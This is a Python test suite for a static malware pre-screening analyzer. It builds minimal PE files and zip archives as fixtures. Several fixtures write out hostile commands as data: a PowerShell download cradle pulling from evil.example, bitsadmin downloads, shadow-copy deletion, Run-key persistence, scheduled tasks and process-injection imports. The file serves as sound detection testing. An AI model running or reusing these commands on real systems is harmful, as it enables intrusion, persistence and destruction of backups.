"""M1 静态预筛测试：最小 PE / 脚本 / 压缩包 / EICAR / 畸形输入 / 性能 / JSON。"""

from __future__ import annotations

import io
import json
import struct
import tempfile
import time
import unittest
import zipfile
from pathlib import Path

from tianti.core.model import Sample, SampleType
from tianti.static import analyze, analyze_bytes
from tianti.static import archive as archive_mod
from tianti.static import pe as pe_mod
from tianti.static import strings as strings_mod

FILE_ALIGN = 0x200
SECTION_ALIGN = 0x1000

EICAR = (
    b"X5O!P%@AP[4" + b"\\" + b"PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


def _import_section(dll: str, functions: list[str]) -> bytes:
    """构造一节区内的导入表：描述符 + thunk + hint/name + DLL 名。"""
    base_rva = 0x1000
    section = bytearray(FILE_ALIGN)
    desc_off = 0
    thunk_off = 40
    name_off = 56
    func_rvas: list[int] = []
    for func in functions:
        blob = b"\x00\x00" + func.encode() + b"\x00"
        section[name_off : name_off + len(blob)] = blob
        func_rvas.append(base_rva + name_off)
        name_off += len(blob)
    dll_blob = dll.encode() + b"\x00"
    section[name_off : name_off + len(dll_blob)] = dll_blob
    dll_rva = base_rva + name_off
    struct.pack_into("<IIIII", section, desc_off, base_rva + thunk_off, 0, 0, dll_rva, base_rva + thunk_off)
    for index, rva in enumerate(func_rvas):
        struct.pack_into("<I", section, thunk_off + index * 4, rva)
    return bytes(section)


def build_pe(
    *,
    is_64: bool = False,
    section_name: bytes = b".text",
    section_data: bytes | None = None,
    section_characteristics: int = 0x60000020,
    imports: tuple[str, list[str]] | None = None,
    overlay: bytes = b"",
) -> bytes:
    """构造最小合法 PE32/PE64（DOS 头 + PE 头 + 1 节区 + 可选导入/overlay）。"""
    optional_size = 0xF0 if is_64 else 0xE0
    e_lfanew = 0x40
    coff = e_lfanew + 4
    optional = coff + 20
    section_table = optional + optional_size
    raw_ptr = 0x200

    header = bytearray(FILE_ALIGN)
    header[0:2] = b"MZ"
    header[0x3C:0x40] = e_lfanew.to_bytes(4, "little")
    header[0x40:0x44] = b"PE" + b"\x00" * 2
    machine = 0x8664 if is_64 else 0x14C
    struct.pack_into("<HHIIIHH", header, coff, machine, 1, 1700000000, 0, 0, optional_size, 0x0022 if is_64 else 0x0102)

    if is_64:
        struct.pack_into("<H", header, optional, 0x20B)
        struct.pack_into("<I", header, optional + 16, 0x1000)  # entry
        struct.pack_into("<Q", header, optional + 24, 0x140000000)  # image base
        num_dirs_off = 108
        dirs_off = 112
    else:
        struct.pack_into("<H", header, optional, 0x10B)
        struct.pack_into("<I", header, optional + 16, 0x1000)
        struct.pack_into("<I", header, optional + 28, 0x400000)
        num_dirs_off = 92
        dirs_off = 96
    struct.pack_into("<I", header, optional + 32, SECTION_ALIGN)
    struct.pack_into("<I", header, optional + 36, FILE_ALIGN)
    struct.pack_into("<I", header, optional + 56, 0x2000)  # SizeOfImage
    struct.pack_into("<I", header, optional + 60, 0x200)  # SizeOfHeaders
    struct.pack_into("<H", header, optional + 68, 3)  # console
    struct.pack_into("<I", header, optional + num_dirs_off, 16)

    if section_data is None:
        if imports:
            section_data = _import_section(imports[0], imports[1])
        else:
            section_data = b"\x90" * FILE_ALIGN
    padded = section_data.ljust(FILE_ALIGN, b"\x00")

    if imports:
        dir_entry = optional + dirs_off + 1 * 8  # IMAGE_DIRECTORY_ENTRY_IMPORT
        struct.pack_into("<II", header, dir_entry, 0x1000, 40)

    struct.pack_into(
        "<8sIIIIIIHHI",
        header,
        section_table,
        section_name.ljust(8, b"\x00"),
        len(section_data),
        0x1000,
        len(padded),
        raw_ptr,
        0,
        0,
        0,
        0,
        section_characteristics,
    )

    data = bytes(header) + padded + overlay
    checksum = pe_mod.compute_checksum(data, optional + 64)
    data = data[: optional + 64] + checksum.to_bytes(4, "little") + data[optional + 68 :]
    return data


def build_zip(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    return buffer.getvalue()


class PETests(unittest.TestCase):
    def test_minimal_pe32(self):
        data = build_pe()
        report = analyze(data, None)
        self.assertEqual(report.type, "pe32")
        self.assertTrue(report.pe and report.pe["valid"])
        self.assertEqual(report.pe["machine"], 0x14C)
        self.assertEqual(report.pe["machine_name"], "i386")
        self.assertEqual(report.pe["subsystem"], 3)
        self.assertEqual(report.pe["num_sections"], 1)
        self.assertEqual(report.sections[0]["name"], ".text")
        self.assertEqual(report.sections[0]["entropy"], 0.0)
        self.assertEqual(report.pe["entrypoint_section"], ".text")
        self.assertTrue(report.pe["checksum_ok"])
        self.assertEqual(report.pe["overlay_size"], 0)
        self.assertFalse(report.pe["has_signature"])
        self.assertEqual(len(report.hashes["sha256"]), 64)
        self.assertEqual(report.size, len(data))
        self.assertIn("pe.unsigned", report.signal_ids)
        self.assertIn("pe.no_imports", report.signal_ids)

    def test_pe64(self):
        data = build_pe(is_64=True)
        report = analyze_bytes(data, "x64.exe")
        self.assertEqual(report.type, "pe64")
        self.assertTrue(report.pe and report.pe["valid"])
        self.assertTrue(report.pe["is_pe32_plus"])
        self.assertEqual(report.pe["machine_name"], "amd64")
        self.assertTrue(report.pe["checksum_ok"])

    def test_imports_and_injection_combo(self):
        data = build_pe(imports=("KERNEL32.dll", ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]))
        report = analyze(data)
        self.assertTrue(report.pe and report.pe["import_count"] == 3)
        self.assertIn("KERNEL32.dll!VirtualAllocEx", report.imports)
        self.assertIn("pe.import_injection", report.signal_ids)
        self.assertNotIn("pe.no_imports", report.signal_ids)

    def test_high_entropy_and_rwx(self):
        high_entropy = bytes(range(256)) * 2
        data = build_pe(section_data=high_entropy, section_characteristics=0xE0000020)
        report = analyze(data)
        self.assertIn("pe.entropy_high", report.signal_ids)
        self.assertIn("pe.rwx_section", report.signal_ids)
        self.assertGreaterEqual(report.sections[0]["entropy"], 7.9)
        self.assertIn("write", report.sections[0]["flags"])
        self.assertIn("execute", report.sections[0]["flags"])

    def test_suspicious_section_name_and_overlay(self):
        data = build_pe(section_name=b"UPX0", overlay=b"PAYLOAD" * 1000)
        report = analyze(data)
        self.assertIn("pe.suspicious_section", report.signal_ids)
        self.assertGreaterEqual(report.pe["overlay_size"], 7000)
        self.assertIn("pe.overlay", report.signal_ids)

    def test_checksum_mismatch(self):
        data = bytearray(build_pe())
        data[0x200] ^= 0xFF
        report = analyze(bytes(data))
        self.assertFalse(report.pe["checksum_ok"])
        self.assertIn("pe.checksum_invalid", report.signal_ids)

    def test_pe64_imports_thunk_width(self):
        # PE64 导入 thunk 是 8 字节；这里只验证不崩溃且导入可解析（构造按 32 位布局，允许解析为空）
        data = build_pe(is_64=True, imports=("KERNEL32.dll", ["Sleep"]))
        report = analyze(data)
        self.assertTrue(report.pe["valid"])

    def test_malformed_pe_does_not_crash(self):
        cases = [
            b"",
            b"MZ",
            b"MZ" + b"\x00" * 10,
            b"MZ" + b"\x00" * 58 + (0x7FFFFFFF).to_bytes(4, "little"),
            b"MZ" + b"\x00" * 58 + (0x40).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 4,
            build_pe()[:0x120],
            build_pe()[:0x80],
            b"Not a PE at all" * 20,
        ]
        for case in cases:
            report = analyze(case)
            self.assertIsInstance(report.to_dict(), dict)
            json.dumps(report.to_dict(), ensure_ascii=False)
            if case[:2] == b"MZ" and len(case) > 0:
                self.assertTrue(report.pe is not None)
                self.assertIn("pe.malformed", report.signal_ids)


class ScriptTests(unittest.TestCase):
    def test_powershell_features(self):
        content = "\n".join(
            [
                "$ErrorActionPreference = 'SilentlyContinue'",
                "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
                "$c = 'SQBFAFgA'",
                "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')",
                "vssadmin delete shadows /all /quiet",
                "schtasks /create /tn Updater /tr cmd.exe /sc onlogon",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d c:\\x.exe",
            ]
        )
        report = analyze_bytes(content.encode("utf-8"), "evil.ps1")
        self.assertEqual(report.type, "script/powershell")
        self.assertEqual(report.script["language"], "powershell")
        ids = report.signal_ids
        for expected in (
            "script.encoded_command",
            "script.execution_policy_bypass",
            "script.hidden_window",
            "script.download_string",
            "script.dynamic_execution",
            "script.vss_delete",
            "script.scheduled_task",
            "script.persistence",
        ):
            self.assertIn(expected, ids, expected)
        self.assertIn("script.download_cradle", ids)

    def test_vbs_js_batch(self):
        vbs = 'CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass"\n' \
              'Set x = CreateObject("MSXML2.XMLHTTP")'
        vbs_report = analyze_bytes(vbs.encode(), "a.vbs")
        self.assertEqual(vbs_report.script["language"], "vbscript")
        self.assertIn("script.shell_object", vbs_report.signal_ids)
        self.assertIn("script.network", vbs_report.signal_ids)

        js = 'var s = new ActiveXObject("WScript.Shell"); eval(unescape("%41"));'
        js_report = analyze_bytes(js.encode(), "a.js")
        self.assertEqual(js_report.script["language"], "javascript")
        self.assertIn("script.activex", js_report.signal_ids)
        self.assertIn("script.dynamic_execution", js_report.signal_ids)

        bat = "\n".join(
            [
                "@echo off",
                "certutil -decode payload.b64 payload.exe",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d payload.exe",
                "vssadmin delete shadows /all /quiet",
                "schtasks /create /tn x /tr payload.exe /sc onlogon",
                "bitsadmin /transfer job http://evil.example/x.exe c:\\x.exe",
                "whoami",
            ]
        )
        bat_report = analyze_bytes(bat.encode(), "a.bat")
        self.assertEqual(bat_report.script["language"], "batch")
        for expected in ("script.certutil_decode", "script.persistence", "script.vss_delete", "script.scheduled_task", "script.download"):
            self.assertIn(expected, bat_report.signal_ids, expected)

    def test_base64_blob(self):
        blob = "A" * 200
        report = analyze_bytes(("powershell -enc " + blob).encode(), "a.ps1")
        self.assertIn("script.encoded_command", report.signal_ids)
        self.assertIn("script.base64_blob", report.signal_ids)

    def test_utf16_script(self):
        content = 'Write-Host "hello"; IEX (New-Object Net.WebClient).DownloadString("http://a.example/x")'
        report = analyze_bytes(content.encode("utf-16"), "a.ps1")
        self.assertEqual(report.script["encoding"], "utf-16")


class ArchiveTests(unittest.TestCase):
    def test_zip_embedded_exe_and_script(self):
        data = build_zip({"payload.exe": build_pe(), "run.ps1": b"IEX 1", "readme.txt": b"hi", "docs/": b""})
        report = analyze(data)
        self.assertEqual(report.type, "archive/zip")
        self.assertTrue(report.archive and report.archive["valid"])
        self.assertGreaterEqual(report.archive["entry_count"], 3)
        ids = report.signal_ids
        self.assertIn("archive.embedded_executable", ids)
        self.assertIn("archive.embedded_script", ids)
        names = [entry["name"] for entry in report.archive["entries"]]
        self.assertIn("payload.exe", names)

    def test_zip_ratio_bomb(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("zeros.bin", b"\x00" * (2 * 1024 * 1024))
        report = analyze(buffer.getvalue())
        self.assertIn("archive.ratio_bomb", report.signal_ids)
        self.assertGreater(report.archive["ratio"], 100)

    def test_zip_path_traversal(self):
        data = build_zip({"../../evil.exe": b"MZ" + b"\x00" * 8})
        report = analyze(data)
        self.assertIn("archive.path_traversal", report.signal_ids)

    def test_rar_and_7z_only_identified(self):
        rar = b"Rar!" + b"\x1a\x07\x00" + b"\x00" * 64
        report = analyze_bytes(rar, "a.rar")
        self.assertEqual(report.type, "archive/rar")
        self.assertFalse(report.archive["supported"])
        self.assertIn("archive.unsupported_format", report.signal_ids)

        seven = b"7z\xbc\xaf\x27\x1c" + b"\x00" * 64
        report7 = analyze_bytes(seven, "a.7z")
        self.assertEqual(report7.archive["format"], "7z")

    def test_office_zip_macro(self):
        data = build_zip({"word/document.xml": b"<xml/>", "word/vbaProject.bin": b"VBA"})
        report = analyze_bytes(data, "report.docx")
        self.assertIn("archive.macro_container", report.signal_ids)

    def test_malformed_zip(self):
        report = analyze_bytes(b"PK\x03\x04" + b"\x00" * 20, "bad.zip")
        self.assertFalse(report.archive["valid"])
        self.assertIn("archive.malformed", report.signal_ids)


class KnownFileAndStringsTests(unittest.TestCase):
    def test_eicar(self):
        report = analyze_bytes(EICAR, "eicar.txt")
        self.assertEqual(report.known_test_file, "eicar")
        self.assertIn("known_test_file.eicar", report.signal_ids)
        self.assertEqual(report.size, 68)
        self.assertEqual(report.type, "text")

    def test_strings_and_iocs(self):
        content = (
            "Visit http://malware.example/gate.php and http://1.2.3.4/a\n"
            "cmd.exe /c whoami\n"
            "CurrentVersion\\Run\n"
            "vssadmin delete shadows /all /quiet\n"
            "powershell -enc SQBFAFgA\n"
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
        )
        report = analyze_bytes(content.encode(), "notes.txt")
        kinds = {ioc["kind"] for ioc in report.ioc_hits}
        self.assertIn("url", kinds)
        self.assertIn("ip", kinds)
        self.assertIn("registry", kinds)
        for expected in ("strings.url", "strings.ip_address", "strings.command_exec", "strings.persistence", "strings.defense_evasion", "strings.encoded_command"):
            self.assertIn(expected, report.signal_ids, expected)
        self.assertGreater(len(report.strings), 0)
        self.assertGreater(len(report.suspicious_strings), 0)

    def test_utf16_strings_extraction(self):
        data = "hello world".encode("utf-16-le")
        result = strings_mod.extract_strings(data)
        self.assertTrue(any("hello world" in value for value in result.strings))
        self.assertGreater(result.utf16_count, 0)

    def test_empty_file(self):
        report = analyze(b"")
        self.assertEqual(report.size, 0)
        self.assertIn("sample.empty", report.signal_ids)

    def test_path_input(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "demo.ps1"
            path.write_text("IEX (New-Object Net.WebClient).DownloadString('http://a.example/x')", encoding="utf-8")
            report = analyze(path)
            self.assertEqual(report.type, "script/powershell")
            self.assertEqual(report.sample["name"], "demo.ps1")
            sample = Sample.from_path(path)
            report2 = analyze(sample)
            self.assertEqual(report2.hashes["sha256"], report.hashes["sha256"])


class SerializationAndPerformanceTests(unittest.TestCase):
    def test_to_dict_json_serializable(self):
        fixtures = [
            analyze(build_pe(imports=("KERNEL32.dll", ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]))),
            analyze_bytes(b"powershell -enc " + b"A" * 200, "a.ps1"),
            analyze(build_zip({"a.exe": build_pe(), "b.ps1": b"IEX 1"})),
            analyze_bytes(EICAR, "eicar.txt"),
            analyze_bytes(b"PK\x03\x04broken", "bad.zip"),
            analyze_bytes(b"MZtruncated", "bad.exe"),
        ]
        for report in fixtures:
            payload = report.to_dict()
            text = json.dumps(payload, ensure_ascii=False)
            self.assertEqual(json.loads(text)["type"], report.type)
            self.assertIsInstance(payload["signals"], list)
            self.assertIsInstance(payload["max_severity"], str)

    def test_ten_fixtures_under_100ms(self):
        high_entropy = bytes(range(256)) * 2048  # 512 KB，用于熵计算压力
        fixtures: list[tuple[str, bytes]] = [
            ("a.exe", build_pe()),
            ("b.exe", build_pe(is_64=True, section_data=high_entropy)),
            ("c.exe", build_pe(section_name=b"UPX0", overlay=b"X" * 4096)),
            ("d.ps1", b"powershell -enc AAAA\nIEX (New-Object Net.WebClient).DownloadString('http://a.example/x')"),
            ("e.vbs", b'CreateObject("WScript.Shell").Run "cmd /c whoami"'),
            ("f.js", b'var x = new ActiveXObject("WScript.Shell"); eval("1");'),
            ("g.bat", b"certutil -decode a.b64 a.exe\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y"),
            ("h.zip", build_zip({"a.exe": build_pe(), "b.txt": b"hello"})),
            ("i.txt", b"plain text fixture data"),
            ("j.txt", b"http://a.example/x 1.2.3.4 cmd.exe /c whoami"),
        ]
        # 用内存字节度量分析器本身（避免临时目录落盘触发杀软实时扫描，污染计时）
        analyze_bytes(fixtures[0][1], fixtures[0][0])  # 预热
        started = time.perf_counter()
        reports = [analyze_bytes(content, name) for name, content in fixtures]
        elapsed_ms = (time.perf_counter() - started) * 1000
        self.assertEqual(len(reports), 10)
        self.assertLess(elapsed_ms, 100.0, f"10 fixtures 静态分析耗时 {elapsed_ms:.1f}ms 超过 100ms")
        self.assertTrue(all(report.elapsed_ms >= 0 for report in reports))


class SignatureNamingTests(unittest.TestCase):
    def test_signal_naming_and_severity(self):
        report = analyze(build_pe(section_name=b"UPX0", section_characteristics=0xE0000020,
                                  section_data=bytes(range(256)) * 2))
        for item in report.signals:
            self.assertRegex(item["id"], r"^[a-z][a-z0-9_]*\.[a-z][a-z0-9_]*$")
            self.assertIn(item["severity"], ("low", "medium", "high", "critical"))
            self.assertTrue(item["detail"])
        self.assertIn(report.top_severity, ("low", "medium", "high", "critical"))

    def test_module_helpers_exist(self):
        self.assertTrue(callable(archive_mod.analyze_archive))
        self.assertTrue(callable(pe_mod.parse_pe))
        self.assertTrue(callable(strings_mod.extract_strings))

    def test_signals_carry_score_hint(self):
        report = analyze(build_pe(section_name=b"UPX0", section_characteristics=0xE0000020))
        for item in report.signals:
            self.assertIsInstance(item.get("score"), (int, float))
            self.assertGreaterEqual(item["score"], 0.0)
        eicar_report = analyze_bytes(EICAR, "eicar.txt")
        eicar_signal = next(item for item in eicar_report.signals if item["id"] == "known_test_file.eicar")
        self.assertEqual(eicar_signal["score"], 0.0)

    def test_delivery_analyzer_shim(self):
        from tianti.static.analyzer import analyze as shim_analyze
        from tianti.static.analyzer import scan as shim_scan
        report = shim_analyze(build_pe())
        self.assertTrue(report.pe["valid"])
        self.assertTrue(shim_scan(b"hello world").to_dict()["type"])


if __name__ == "__main__":
    unittest.main()
